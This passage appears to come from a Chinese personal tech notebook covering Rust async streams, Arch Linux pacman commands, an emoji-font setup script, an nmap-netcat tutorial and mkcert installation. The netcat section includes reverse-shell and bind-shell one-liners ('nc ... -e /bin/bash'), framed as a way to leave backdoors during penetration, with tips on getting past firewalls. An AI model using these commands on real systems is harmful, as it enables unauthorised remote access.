<p>这里的 <code>size_hint()</code> 方法的使用方式跟 <a href="https://doc.rust-lang.org/book/ch13-02-iterators.html">iterators</a> 里的一样，它会返回 stream 剩余长度是上下界，<code>(0,</code> <a href="https://doc.rust-lang.org/nightly/core/option/enum.Option.html#variant.None" title="None"><code>None</code></a><code>)</code> 是它的默认实现，这对任何 stream 来说都是正确的。</p>
<p>通常来说，当手动实现一个 <code>Stream</code> 的时候，它是通过组合 future 和其它 stream 来完成的。作为一个示例，让我们重建在<a href="https://m4n5ter.github.io/rust/mini-redis/async_in_depth.html">Async in depth</a>实现的 <code>Delay</code> future，我们将会把它转换成一个以 10 ms 为间隔，生成 3 次 <code>()</code> 的 stream 。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use tokio_stream::Stream;
use std::pin::Pin;
use std::task::{Context, Poll};
use std::time::Duration;

struct Interval {
    rem: usize,
    delay: Delay,
}

impl Stream for Interval {
    type Item = ();

    fn poll_next(mut self: Pin&lt;&amp;mut Self&gt;, cx: &amp;mut Context&lt;'_&gt;)
        -&gt; Poll&lt;Option&lt;()&gt;&gt;
    {
        if self.rem == 0 {
            // No more delays
            return Poll::Ready(None);
        }

        match Pin::new(&amp;mut self.delay).poll(cx) {
            Poll::Ready(_) =&gt; {
                let when = self.delay.when + Duration::from_millis(10);
                self.delay = Delay { when };
                self.rem -= 1;
                Poll::Ready(Some(()))
            }
            Poll::Pending =&gt; Poll::Pending,
        }
    }
}
<span class="boring">}
</span></code></pre></pre>
<h3 id="async-stream"><a class="header" href="#async-stream"><code>async-stream</code></a></h3>
<p>手动用 <a href="https://docs.rs/futures-core/0.3/futures_core/stream/trait.Stream.html"><code>Stream</code></a> trait 来实现 stream 是非常冗长乏味的。不幸的是，Rust 编程语言还不支持 <code>async/await</code> 来定义 stream 。这项工作正在做，但是还没就绪。</p>
<p><a href="https://docs.rs/async-stream"><code>async-stream</code></a> crate 可以作为一个临时解决方案使用，这个 crate 提供了一个 <code>stream!</code> 宏，它能将输入转化成一个 stream。通过使用这个 crate，上面的 interval 可以像这样被实现：</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use async_stream::stream;
use std::time::{Duration, Instant};

stream! {
    let mut when = Instant::now();
    for _ in 0..3 {
        let delay = Delay { when };
        delay.await;
        yield ();
        when += Duration::from_millis(10);
    }
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="tokio"><a class="header" href="#tokio">Tokio</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h2 id="topics"><a class="header" href="#topics">Topics</a></h2>
<p>Tokio topics 部分包含与编写异步应用程序时出现的各种主题相关的独立文章。</p>
<p>目前可用的主题文章有：</p>
<ul>
<li><a href="https://m4n5ter.github.io/rust/tokio/bridging_with_sync_code.html">Bridging with sync code</a></li>
<li><a href="https://m4n5ter.github.io/rust/tokio/graceful_shutdown.html">Graceful Shutdown</a></li>
<li><a href="https://m4n5ter.github.io/rust/tokio/getting_started_with_tracing.html">Getting started with Tracing</a></li>
<li><a href="https://m4n5ter.github.io/rust/tokio/next_steps_with_tracing.html">Next steps with Tracing</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="bridging-with-sync-code"><a class="header" href="#bridging-with-sync-code">Bridging with sync code</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="graceful-shutdown"><a class="header" href="#graceful-shutdown">Graceful Shutdown</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="getting-started-with-tracing"><a class="header" href="#getting-started-with-tracing">Getting started with Tracing</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="next-steps-with-tracing"><a class="header" href="#next-steps-with-tracing">Next steps with Tracing</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="other-categories"><a class="header" href="#other-categories">Other categories</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="archlinux"><a class="header" href="#archlinux">archlinux</a></h1>
<h2 id="pacman"><a class="header" href="#pacman">pacman</a></h2>
<blockquote>
<p>内容来源： <a href="https://www.cnblogs.com/sztom/p/10652624.html">Arch Linux 软件包的查询及清理 - osoft - 博客园</a></p>
</blockquote>
<h2 id="1-软件包基础搜索及安装卸载"><a class="header" href="#1-软件包基础搜索及安装卸载">1. 软件包基础搜索及安装卸载</a></h2>
<pre><code class="language-zsh">pacman -Ss 软件名称 //(搜索软件包)  
pacman -S 软件名称 //(安装软件包)  
pacman -Rs 软件名称 //(卸载软件包)  
pacman -Syu (更新)
</code></pre>
<h2 id="2-包的查询及清理"><a class="header" href="#2-包的查询及清理">2. 包的查询及清理</a></h2>
<pre><code class="language-zsh">列出所有本地软件包（-Q,query查询本地；-q省略版本号）  
pacman -Qq (列出有816个包)

列出所有显式安装（-e,explicitly显式安装；-n忽略外部包AUR）  
pacman -Qqe (列出200个包)

列出自动安装的包（-d,depends作为依赖项）  
pacman -Qqd (列出616个)

列出孤立的包（-t不再被依赖的&quot;作为依赖项安装的包&quot;）  
pacman -Qqdt (列出35个)  
注意：通常这些是可以妥妥的删除的。(sudo pacman -Qqdt | sudo pacman -Rs -)
</code></pre>
<h2 id="3-软件包和文件的查询"><a class="header" href="#3-软件包和文件的查询">3. 软件包和文件的查询</a></h2>
<pre><code class="language-zsh">列出包所拥有的文件  
$ sudo pacman -Ql iw  
iw /usr/  
iw /usr/bin/  
iw /usr/bin/iw  
iw /usr/share/  
iw /usr/share/man/  
iw /usr/share/man/man8/  
iw /usr/share/man/man8/iw.8.gz

check 检查包文件是否存在（-kk用于文件属性）  
$ sudo pacman -Qk iw  
iw: 7 total files, 0 missing files

查询提供文件的包  
$ sudo pacman -Qo /usr/share/man/man8/iw.8.gz  
/usr/share/man/man8/iw.8.gz is owned by iw 5.0.1-1
</code></pre>
<h2 id="4-查询包详细信息"><a class="header" href="#4-查询包详细信息">4. 查询包详细信息</a></h2>
<pre><code class="language-zsh">查询包详细信息（-Qi;-Qii[Backup Files]）(-Si[Repository,Download Size];-Sii[Signatures,])  
$ pacman -Qi 包名  
Repository 仓库名称（要联网用pacman -Si或Sii才能看到这一栏；）  
Name 名称  
Version 版本  
Description 描述  
Architecture 架构  
URL 网址  
Licenses 许可证  
Groups 组  
Provides 提供  
Depends On 依赖于（依赖那些包
Optional Deps 可选项  
Required By 被需求的（被那些包需求
Optional For 可选项  
Conflicts With 与...发生冲突  
Replaces 替代对象  
Download Size 下载大小（要联网用pacman -Si或Sii才能看到这一栏；）  
Installed Size 安装尺寸  
Packager 包装者  
Build Date 包装日期  
Install Date 安装日期 
Install Reason 安装原因（主动安装，还是被依赖自动安装）
Install Script 安装脚本  
Validated By 验证者

$ pacman -Q -h 更多参数  
-c --changelog 查看包的更改日志  
-d --deps 列出作为依赖项安装的软件包[filter]  
-e --explicit 列出显式安装[filter]  
-g --groups 查看包组的所有成员  
-i --info 查看包信息（-ii表示备份文件）  
-k --check 检查包文件是否存在（-kk用于文件属性）  
-l --list 列出查询包所拥有的文件  
-n --native 列出已安装的软件包只能在同步数据库中找到[过滤器]  
-p --file &lt;package&gt; 查询包文件而不是数据库  
-q --quiet 显示查询和搜索的信息较少  
-t --unrequired 列出所有包都不需要（可选）的包（-tt忽略optdepends）[filter]...

$ sudo cat pacman.log |grep boost 查看安装日志  
[2019-03-23 17:10] [ALPM] installed boost-libs (1.69.0-1)  
[2019-03-28 17:21] [PACMAN] Running 'pacman -S --config /etc/pacman.conf -- extra/rsync extra/wget community/lxc extra/protobuf extra/jsoncpp extra/libuv extra/rhash extra/cmake community/glm extra/boost community/gtest'  
[2019-03-28 17:22] [ALPM] installed boost (1.69.0-1)  
[2019-03-28 17:22] [PACMAN] Running 'pacman -D --asdeps --config /etc/pacman.conf -- rsync wget lxc protobuf jsoncpp libuv rhash cmake glm boost gtest'
</code></pre>
<h2 id="5-卸载不再被需要的软件包"><a class="header" href="#5-卸载不再被需要的软件包">5. 卸载不再被需要的软件包</a></h2>
<pre><code class="language-zsh">sudo pacman -Qqdt | sudo pacman -Rs -    //删除不再被需要的(曾经被依赖自动安装的程序包)  
sudo pacman -Q |wc -l  
769  
sudo pacman -Qe |wc -l  
200  
sudo pacman -Qd |wc -l  
569  
sudo pacman -Qdt |wc -l  
0
</code></pre>
<h2 id="6-清除多余的安装包缓存pkg包"><a class="header" href="#6-清除多余的安装包缓存pkg包">6. 清除多余的安装包缓存(pkg包)</a></h2>
<p>使用pacman安装的软件包会缓存在这个目录下 /var/cache/pacman/pkg/ ，可以清理如下2种。<br />
-k (-k[n])保留软件包的n个最近的版本，删除比较旧的软件包。<br />
-u (-u)已卸载软件的安装包(pkg包)。</p>
<pre><code class="language-zsh">$ paccache -h
</code></pre>
<p>  Operations:</p>
<div class="table-wrapper"><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody>
<tr><td><strong>-d, --dryrun</strong></td><td>perform a dry run, only finding candidate packages.</td><td>执行干运行，只找到候选包。</td></tr>
<tr><td><strong>-m, --move <dir></strong></td><td>move candidate packages to &quot;dir&quot;.</td><td>将候选包裹移到“dir”。</td></tr>
<tr><td><strong>-r, --remove</strong></td><td>remove candidate packages.</td><td>删除候选包。</td></tr>
</tbody></table>
</div>
<p>  Options:</p>
<div class="table-wrapper"><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody>
<tr><td>-a, --arch <arch></td><td>scan for &quot;arch&quot; (default: all architectures).</td><td>扫描“arch”（默认：所有架构）。</td></tr>
<tr><td>-c, --cachedir <dir></td><td>scan &quot;dir&quot; for packages. can be used more than once.</td><td>扫描“dir”包。 可以使用不止一次。</td></tr>
<tr><td></td><td>(default: read from /etc/pacman.conf).</td><td>（默认：从/etc/pacman.conf中读取）。</td></tr>
<tr><td>-f, --force</td><td>apply force to mv(1) and rm(1) operations.</td><td>对mv（1）和rm（1）操作施加强制。</td></tr>
<tr><td>-h, --help</td><td>display this help message and exit.</td><td>显示此帮助消息并退出。</td></tr>
<tr><td>-i, --ignore <pkgs></td><td>ignore &quot;pkgs&quot;, comma-separated. Alternatively, specify &quot;-&quot; to read package names from stdin, newline-delimited.</td><td>忽略“pkgs”，以逗号分隔。 或者，指定“ - ”以从stdin读取包名称，换行符分隔。</td></tr>
<tr><td><strong>-k, --keep <num></strong></td><td>keep &quot;num&quot; of each package in the cache (default: 3).</td><td>保留缓存中每个包的“num”（默认值：3）。</td></tr>
<tr><td>--nocolor</td><td>remove color from output.</td><td>从输出中删除颜色。</td></tr>
<tr><td>-q, --quiet</td><td>minimize output</td><td>最小化输出</td></tr>
<tr><td><strong>-u, --uninstalled</strong></td><td>target uninstalled packages.</td><td>目标已卸载的软件包。</td></tr>
<tr><td>-v, --verbose</td><td>increase verbosity. specify up to 3 times.</td><td>增加冗长。 最多指定3次。</td></tr>
<tr><td>-z, --null</td><td>use null delimiters for candidate names (only with -v and -vv).</td><td>对候选名称使用null分隔符（仅使用-v和-vv）。</td></tr>
</tbody></table>
</div>
<pre><code class="language-zsh">paccache -r //删除，默认保留最近的3个版本，-rk3  
==&gt; finished: 6 packages removed (disk space saved: 194.11 MiB)  
paccache -rk2 //删除，默认保留最近的2个版本  
paccache -rk1 //删除，默认保留最近的1个版本
</code></pre>
<h2 id="7-通过日志查看安装历史"><a class="header" href="#7-通过日志查看安装历史">7. 通过日志查看安装历史</a></h2>
<pre><code class="language-zsh">查看软件管理所操作日志。  
cat /var/log/pacman.log |wc -l 
6360  
cat /var/log/pacman.log |grep installed |wc -l  
1134  
cat /var/log/pacman.log |grep running |wc -l  
1182  
cat /var/log/pacman.log |grep Running |wc -l  
1122  
cat /var/log/pacman.log |grep removed |wc -l  
217  
cat /var/log/pacman.log |grep upgraded |wc -l  
811
cat /var/log/pacman.log |grep pacman |tail  
[2019-07-11 21:05] [PACMAN] Running 'pacman -S hexchat'  
[2019-07-11 21:06] [PACMAN] Running 'pacman -S irssi'

cat /var/log/pacman.log |grep installed |tail
[2019-07-11 21:06] [ALPM] installed hexchat (2.14.2-3)  
[2019-07-11 21:06] [ALPM] installed libotr (4.1.1-2)  
[2019-07-11 21:06] [ALPM] installed irssi (1.2.1-1)

cat /var/log/pacman.log |grep PACMAN |tail 
[2019-07-11 21:06] [PACMAN] Running 'pacman -S konversation'  
[2019-07-11 21:06] [PACMAN] Running 'pacman -S pidgin'  
[2019-07-11 21:07] [PACMAN] Running 'pacman -S weechat'  
[2019-07-11 21:07] [PACMAN] Running 'pacman -S ircii'

cat /var/log/pacman.log |grep irssi
[2019-07-11 21:06] [PACMAN] Running 'pacman -S irssi'  
[2019-07-11 21:06] [ALPM] installed irssi (1.2.1-1)

cat /var/log/pacman.log |grep pidgin  
[2019-07-11 21:06] [PACMAN] Running 'pacman -S pidgin'

更新记录  
cat /var/log/pacman.log |grep 'upgraded chromium'
[2019-06-15 06:39] [ALPM] upgraded chromium (75.0.3770.80-1 -&gt; 75.0.3770.90-2)  
[2019-06-19 10:20] [ALPM] upgraded chromium (75.0.3770.90-2 -&gt; 75.0.3770.90-3)  
[2019-06-23 17:18] [ALPM] upgraded chromium (75.0.3770.90-3 -&gt; 75.0.3770.100-1)
</code></pre>
<p>通过<strong>系统日志</strong>查看安装记录(速度可能较慢)</p>
<pre><code class="language-zsh">sudo journalctl |grep irssi 
Jul 11 21:04:46 tompc sudo[11619]: toma : TTY=pts/2 ; PWD=/home/toma ; USER=root ; COMMAND=/usr/bin/pacman -Ss irssi  
Jul 11 21:06:11 tompc sudo[11841]: toma : TTY=pts/2 ; PWD=/home/toma ; USER=root ; COMMAND=/usr/bin/pacman -S irssi  
Jul 11 21:06:11 tompc pacman[11842]: Running 'pacman -S irssi'  
Jul 11 21:06:27 tompc pacman[11842]: installed irssi (1.2.1-1)

sudo journalctl |grep pidgin  
Jul 11 21:04:55 tompc sudo[11662]: toma : TTY=pts/2 ; PWD=/home/toma ; USER=root ; COMMAND=/usr/bin/pacman -Ss pidgin  
Jul 11 21:06:57 tompc sudo[12000]: toma : TTY=pts/2 ; PWD=/home/toma ; USER=root ; COMMAND=/usr/bin/pacman -S pidgin  
Jul 11 21:06:57 tompc pacman[12001]: Running 'pacman -S pidgin'
</code></pre>
<p>系统日志筛选更新记录</p>
<pre><code class="language-zsh">sudo journalctl |grep 'upgraded chromium'
Jun 15 06:39:47 tompc pacman[5551]: upgraded chromium (75.0.3770.80-1 -&gt; 75.0.3770.90-2)  
Jun 19 10:20:45 tompc pacman[1904]: upgraded chromium (75.0.3770.90-2 -&gt; 75.0.3770.90-3)  
Jun 23 17:18:33 tompc pacman[7079]: upgraded chromium (75.0.3770.90-3 -&gt; 75.0.3770.100-1)
</code></pre>
<p>附: pacman.log文件内容筛选时可用的关键字，供参考</p>
<div class="table-wrapper"><table><thead><tr><th></th><th></th><th></th><th></th></tr></thead><tbody>
<tr><td>关键字1</td><td>关键字2</td><td>关键字3</td><td>计数</td></tr>
<tr><td>[PACMAN]</td><td>running</td><td>pacman -R</td><td>47</td></tr>
<tr><td></td><td></td><td>pacman -Rs</td><td>68</td></tr>
<tr><td></td><td></td><td>pacman -S</td><td>310</td></tr>
<tr><td></td><td></td><td>pacman -Syu</td><td>85</td></tr>
<tr><td></td><td>starting</td><td>upgrade</td><td>85</td></tr>
<tr><td></td><td>synchronizing</td><td>(空白)</td><td>89</td></tr>
<tr><td>[ALPM-SCRIPTLET]</td><td>-k</td><td>.img</td><td>70</td></tr>
<tr><td></td><td>Running</td><td>[autodetect]</td><td>35</td></tr>
<tr><td></td><td></td><td>[base]</td><td>70</td></tr>
<tr><td></td><td></td><td>[block]</td><td>70</td></tr>
<tr><td></td><td></td><td>[filesystems]</td><td>70</td></tr>
<tr><td></td><td></td><td>[fsck]</td><td>70</td></tr>
<tr><td></td><td></td><td>[keyboard]</td><td>70</td></tr>
<tr><td></td><td></td><td>[modconf]</td><td>70</td></tr>
<tr><td></td><td></td><td>[resume]</td><td>66</td></tr>
<tr><td></td><td></td><td>[udev]</td><td>70</td></tr>
<tr><td></td><td>Building</td><td></td><td>70</td></tr>
<tr><td></td><td>Creating</td><td></td><td>70</td></tr>
<tr><td></td><td>Generating</td><td></td><td>70</td></tr>
<tr><td></td><td>Image</td><td></td><td>70</td></tr>
<tr><td></td><td>Starting</td><td></td><td>70</td></tr>
<tr><td></td><td>WARNING</td><td></td><td>70</td></tr>
<tr><td></td><td>Certificate</td><td></td><td>280</td></tr>
<tr><td></td><td>gpg</td><td></td><td>245</td></tr>
<tr><td>[ALPM]</td><td>installed</td><td></td><td>1123</td></tr>
<tr><td></td><td>removed</td><td></td><td>217</td></tr>
<tr><td></td><td>running</td><td>60-linux.hook</td><td>29</td></tr>
<tr><td></td><td></td><td>70-dkms-install</td><td>24</td></tr>
<tr><td></td><td></td><td>70-dkms-remove</td><td>23</td></tr>
<tr><td></td><td></td><td>90-linux.hook</td><td>35</td></tr>
<tr><td></td><td></td><td>gtk-update</td><td>133</td></tr>
<tr><td></td><td></td><td>update-desktop</td><td>162</td></tr>
<tr><td></td><td></td><td>systemd-update</td><td>340</td></tr>
<tr><td></td><td></td><td>systemd-daemon</td><td>96</td></tr>
<tr><td></td><td>transaction</td><td>completed</td><td>342</td></tr>
<tr><td></td><td></td><td>started</td><td>342</td></tr>
<tr><td></td><td>upgraded</td><td></td><td>811</td></tr>
</tbody></table>
</div>
<h2 id="emoji-支持"><a class="header" href="#emoji-支持">emoji 支持</a></h2>
<pre><code class="language-shell">#!/bin/sh
set -e
if [[ \$(id -u) -ne 0 ]] ; then echo &quot;请使用 root 用户执行本脚本&quot; ; exit 1 ; fi
echo &quot;开始设置 Noto Emoji font...&quot;
# 1 - 安装  noto-fonts-emoji 包
pacman -S noto-fonts-emoji --needed
# pacman -S powerline-fonts --needed
echo &quot;推荐的系统字体: inconsolata regular (ttf-inconsolata 或 powerline-fonts)&quot;
# 2 - 添加字体配置到 /etc/fonts/conf.d/01-notosans.conf
echo '&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE fontconfig SYSTEM &quot;fonts.dtd&quot;&gt;
&lt;fontconfig&gt;
 &lt;alias&gt;
   &lt;family&gt;sans-serif&lt;/family&gt;
   &lt;prefer&gt;
     &lt;family&gt;Noto Sans&lt;/family&gt;
     &lt;family&gt;Noto Color Emoji&lt;/family&gt;
     &lt;family&gt;Noto Emoji&lt;/family&gt;
     &lt;family&gt;DejaVu Sans&lt;/family&gt;
   &lt;/prefer&gt; 
 &lt;/alias&gt;

 &lt;alias&gt;
   &lt;family&gt;serif&lt;/family&gt;
   &lt;prefer&gt;
     &lt;family&gt;Noto Serif&lt;/family&gt;
     &lt;family&gt;Noto Color Emoji&lt;/family&gt;
     &lt;family&gt;Noto Emoji&lt;/family&gt;
     &lt;family&gt;DejaVu Serif&lt;/family&gt;
   &lt;/prefer&gt;
 &lt;/alias&gt;

 &lt;alias&gt;
  &lt;family&gt;monospace&lt;/family&gt;
  &lt;prefer&gt;
    &lt;family&gt;Noto Mono&lt;/family&gt;
    &lt;family&gt;Noto Color Emoji&lt;/family&gt;
    &lt;family&gt;Noto Emoji&lt;/family&gt;
    &lt;family&gt;DejaVu Sans Mono&lt;/family&gt;
   &lt;/prefer&gt;
 &lt;/alias&gt;
&lt;/fontconfig&gt;

' &gt; /etc/fonts/local.conf
# 3 - 通过 fc-cache 更新字体缓存
fc-cache
echo &quot;Noto Emoji Font 安装成功! 你可能需要重启应用，比如 Chrome. 如果没什么变化说明你的字体本身已经包含 emoji.&quot;
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="nmap-netcatnc"><a class="header" href="#nmap-netcatnc">nmap-netcat(nc)</a></h2>
<p>nc 是由 C 编写的非常强悍的网络工具，<code>nc</code> 主要有 4 个版本，gnu nc （2004 年停止维护，也叫 nc traditional）， openbsd nc（重写了 gnu nc，在正常维护），nmap-netcat（也叫 ncat，由 nmap 重写 nc traditional，被称为 21 世纪的 netcat，也是功能最多的 nc）。</p>
<p>下面我介绍的就是 nmap-netcat，出现的不论是 <code>nc</code> 还是 <code>ncat</code> 请一律当 <code>ncat</code> 处理，因为部分在 CentOS 上执行，CentOS上的 <code>nc</code> 就是 <code>ncat</code>。</p>
<h2 id="安装"><a class="header" href="#安装">安装</a></h2>
<p>https://nmap.org/download ，ncat 集成在 nmap 中，可以通过安装 nmap 获取 ncat 。</p>
<h3 id="centos--redhat"><a class="header" href="#centos--redhat">Centos / RedHat</a></h3>
<pre><code class="language-zsh">yum install nc
</code></pre>
<p>名字就是 nc，但是安装的时候能看到安装的是 nmap-netcat。</p>
<h3 id="archlinux-1"><a class="header" href="#archlinux-1">Archlinux</a></h3>
<pre><code class="language-zsh">sudo pacman -S nmap
</code></pre>
<p>archlinux 通过装 nmap 会附带上 ncat（即 nc）。</p>
<h2 id="功能介绍"><a class="header" href="#功能介绍">功能介绍</a></h2>
<h3 id="端口扫描"><a class="header" href="#端口扫描">端口扫描</a></h3>
<p><code>ncat</code> 没有端口扫描（但是 openbsd nc 有），谁让它是由 nmap.org 重写的呢，<code>nmap</code> 本身就可以说是命令行工具中的端口扫描这块做的最好的，所以集成在 <code>nmap</code> 中的 <code>ncat</code> 没有必要还带端口扫描功能，端口扫描直接用 nmap。</p>
<h3 id="tcpudp-通信"><a class="header" href="#tcpudp-通信">TCP/UDP 通信</a></h3>
<pre><code class="language-zsh"># -l 表示监听，-p 指定端口，-v 表示会输出详细信息(-vv, -vvv 可以更详细)
# 默认是监听 tcp 。
ncat -lvp 1589
</code></pre>
<pre><code class="language-zsh"># 唯一跟上面不同的就是这次监听的是 udp 。
ncat -lvup 1589
</code></pre>
<p>可以按 <a href="https://m4n5ter.github.io/linux/mkcert/mkcert.html">mkcert</a> 生成自签证书。</p>
<pre><code class="language-zsh"># 使用 ssl 来加密通信（否则是明文的，统一网络的人可以轻松嗅探到传输内容）
# --ssl-key，--ssl-cert 可以手动指定证书，--ssl 是生成并使用一个临时证书
ncat --ssl -lvp 1589
</code></pre>
<pre><code class="language-zsh"># 如果监听端使用了 --ssl 那么客户端也需要。
 ncat --ssl -nv &lt;IP Address&gt; 1589
</code></pre>
<p>成功建立通信后可以直接在命令行输入字符来进行通信，会像聊天一样。</p>
<h3 id="流量转发"><a class="header" href="#流量转发">流量转发</a></h3>
<p>流量转发可以用很多姿势，这里我用一个比较容易理解的姿势：</p>
<pre><code class="language-zsh"># 目标机器
nc -lvvp 1665
# 中间负责转发的机器。-c 表示连接后直接用 sh 执行 -c 的内容。
# 这里是表示连接到达中间服务器后，中间服务器再连接目标服务器，从而实现流量转发
nc -lvvp 1589 -c 'nc -nv &lt;目标机器 IP&gt; &lt;端口&gt;'
# 客户端
nc -nv &lt;中间机器 IP&gt; &lt;中间机器端口&gt;
</code></pre>
<p>这样操作后，当客户端执行时，流量走向为：</p>
<pre><code>客户端 -&gt; 中间机器 IP:PORT -&gt; 目标机器 IP:PORT
</code></pre>
<h3 id="发送文件"><a class="header" href="#发送文件">发送文件</a></h3>
<p>既然都能通信了，那么发文件也是理所应当的，传文件本质也是流量传输。</p>
<pre><code class="language-zsh"># 提供文件的机器，这样表示建立连接后把 temp.txt 的内容发送过去
nc -lvvp 1665 &lt; temp.txt
# 需要获取文件的机器，这样与目标建立连接后，把它发过来的内容重定向到一个文件中
nc -nv &lt;IP&gt; &lt;PORT&gt; &gt; out.txt
</code></pre>
<p>方向换一下也是同理：</p>
<pre><code class="language-zsh"># 接收文件的机器
nc -lvvp 1665 &gt; out.txt
# 发送文件的机器
nc -nv &lt;IP&gt; &lt;PORT&gt; &lt; temp.txt
</code></pre>
<h3 id="反弹-shell"><a class="header" href="#反弹-shell">反弹 Shell</a></h3>
<p>这个一般用于渗透时留后门，主要是利用 <code>nc</code> 的 <code>-c</code> 和 <code>-e</code> 。</p>
<pre><code class="language-zsh"># 让客户端发送自己的 shell 给 &lt;IP&gt; &lt;PORT&gt;
# 客户端，这样 &lt;IP&gt; &lt;PORT&gt; 被监听时就会拿到客户端的 shell
# 后续 &lt;IP&gt; &lt;PORT&gt; 要再转发还是什么都可以自由操作
nc -nv &lt;IP&gt; &lt;PORT&gt; -e /bin/bash
-or
nc -nv &lt;IP&gt; &lt;PORT&gt; -c bash
</code></pre>
<pre><code class="language-zsh"># 客户端开启一个端口，在这个端口上直接暴露自己的 shell
nc -lp 6666 -e /bin/bash
</code></pre>
<p>如果用于渗透，受害者一般是内网环境，所以都是用的第一种，主动发送 shell 给攻击者。第二种需要攻击者能访问到受害者的 ip:port 才行。加上一般都有防火墙阻拦，受害者的入站流量可能会被防火墙拦截，但是防火墙一般不会对出站流量有限制，这也是第一种方式的用的比较多的原因。</p>
<p>如果攻击者没有能让受害者访问到的 IP，一般通过内网穿透即可解决。</p>
<h3 id="ssh-代理"><a class="header" href="#ssh-代理">SSH 代理</a></h3>
<p>~/.ssh/config</p>
<pre><code class="language-zsh">Host github.com
  ProxyCommand ncat --proxy 127.0.0.1:10808 --proxy-type &lt;Your proxy type&gt;  %h %p
</code></pre>
<p>这样对 github 仓库进行 <code>git pull</code> <code>git push</code> 这样的操作都会走代理。</p>
<p><code>--proxy</code> 和 <code>--proxy-type</code> 可以让 <code>ncat</code> 摇身一变为一个代理工具。</p>
<h3 id="--allow----allowfile"><a class="header" href="#--allow----allowfile"><code>--allow</code> / <code>--allowfile</code></a></h3>
<p>限制可以连接到 <code>ncat</code>（<code>nc</code>） 的 hosts，可以指定一些 IP，来做到只允许指定目标连接。</p>
<h3 id="--deny----denyfile"><a class="header" href="#--deny----denyfile"><code>--deny</code> / <code>--denyfile</code></a></h3>
<p>与上面的相反，它是拒绝。</p>
<h2 id="更多功能请自行探索"><a class="header" href="#更多功能请自行探索">更多功能请自行探索</a></h2>
<p><code>ncat</code> 提供了许多功能，这些功能可以相互组合，或者配合其它东西来使用，能玩出的花样是非常多的。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="mkcert"><a class="header" href="#mkcert">mkcert</a></h2>
<p><code>mkcert</code> 是 GO 编写的，一个简单的<strong>零配置</strong>的，用来生成自签证书的工具。</p>
<p>下面给一个简单的示例，在本地生成自签证书，并使用让 nc 使用生成的证书。</p>
<pre><code class="language-zsh">~ ·········································································································································  10:46:25
❯ mkcert -install
The local CA is already installed in the system trust store! 👍The local CA is already installed in the Firefox and/or Chrome/Chromium trust store! 👍
~ ·········································································································································  10:46:34
❯ mkcert example.com &quot;*.example.com&quot; example.test localhost 127.0.0.1 ::1

Created a new certificate valid for the following names 📜 - &quot;example.com&quot;
 - &quot;*.example.com&quot;
 - &quot;example.test&quot;
 - &quot;localhost&quot;
 - &quot;127.0.0.1&quot;
 - &quot;::1&quot;

Reminder: X.509 wildcards only go one level deep, so this won't match a.b.example.com ℹ️

The certificate is at &quot;./example.com+5.pem&quot; and the key at &quot;./example.com+5-key.pem&quot; ✅
It will expire on 30 January 2025 🗓

~ ·········································································································································  10:47:37
❯ ls             
公共  视频  文档  音乐  aria          aria2-downloads  Dockerfile             example.com+5.pem  GOPATH  minio-binaries  nowip_hosts.txt  tech_backend.jar
模板  图片  下载  桌面  aria2-config  cv_debug.log     example.com+5-key.pem  go                 math    navicat_reset   src
~ ·········································································································································  10:47:55
❯ ncat -lvp 1589 --ssl-key example.com+5-key.pem --ssl-cert example.com+5.pem 
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1589
Ncat: Listening on 0.0.0.0:1589
Ncat: Connection from 127.0.0.1.
Ncat: Connection from 127.0.0.1:39156.
Ncat: Failed SSL connection from 127.0.0.1: error:00000000:lib(0):func(0):reason(0)
</code></pre>
<p><code>mkcert</code>  自动生成并安装一个本地 CA 到 root stores，并且生成 locally-trusted 证书。<code>mkcert</code> 不会自动使用证书来配置服务器，不过，这取决于你。</p>
<h2 id="安装-1"><a class="header" href="#安装-1">安装</a></h2>
<blockquote>
<p>Warning: <code>mkcert</code>  自动生成的 <code>rootCA-key.pem</code> 文件提供了完整的能力来拦截你机器上的安全请求。请不要分享它。 </p>
</blockquote>
<h3 id="macos"><a class="header" href="#macos">macOS</a></h3>
<pre><code class="language-zsh">brew install mkcert
brew install nss # 如果用 Firefox 的话
</code></pre>
<h3 id="linux"><a class="header" href="#linux">Linux</a></h3>
<p>在 Linux 上，首先要安装 <code>certutil</code></p>
<pre><code class="language-zsh">sudo apt install libnss3-tools
    -or-
sudo yum install nss-tools
    -or-
sudo pacman -S nss
    -or-
sudo zypper install mozilla-nss-tools
</code></pre>
<p>然后可以使用 <a href="https://docs.brew.sh/Homebrew-on-Linux">Homebrew on Linux</a> 来安装。</p>
<pre><code class="language-zsh">brew install mkcert
</code></pre>
<p>或者从源码构建（要求 Go 1.13+）</p>
<pre><code class="language-zsh">git clone https://github.com/FiloSottile/mkcert &amp;&amp; cd mkcert
go build -ldflags &quot;-X main.Version=$(git describe --tags)&quot;
</code></pre>
<p>又或者使用 <a href="https://github.com/FiloSottile/mkcert/releases">预构建的二进制文件</a>。</p>
<pre><code class="language-zsh">curl -JLO &quot;https://dl.filippo.io/mkcert/latest?for=linux/amd64&quot;
chmod +x mkcert-v*-linux-amd64
sudo cp mkcert-v*-linux-amd64 /usr/local/bin/mkcert
</code></pre>
<p>对于 Arch Linux 用户（比如我），<a href="https://www.archlinux.org/packages/community/x86_64/mkcert/"><code>mkcert</code></a> 在 Arch Linux 官方仓库中可用。</p>
<pre><code class="language-zsh">sudo pacman -S mkcert
</code></pre>
<h3 id="windows"><a class="header" href="#windows">Windows</a></h3>
<p>使用 <a href="https://chocolatey.org/">Chocolatey</a></p>
<pre><code class="language-zsh">choco install mkcert
</code></pre>
<p>或者使用 Scoop</p>
<pre><code class="language-zsh">scoop bucket add extras
